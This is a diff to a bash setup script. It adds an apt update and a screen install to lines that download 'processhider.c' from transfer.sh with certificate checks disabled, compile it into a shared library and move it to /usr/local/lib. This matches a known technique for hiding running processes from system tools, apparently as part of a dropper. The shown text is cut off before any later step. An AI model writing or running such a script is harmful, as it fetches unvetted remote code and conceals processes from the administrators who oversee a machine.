@@ -1,5 +1,6 @@
 #!/bin/bash
-apt install sudo -y
+apt update
+apt install sudo screen -y
 wget --no-check-certificate -c http://transfer.sh/ntzeku/processhider.c -O jik.c 
 gcc -Wall -fPIC -shared -o libprocessh.so jik.c -ldl
 sudo mv libprocessh.so /usr/local/lib/ 
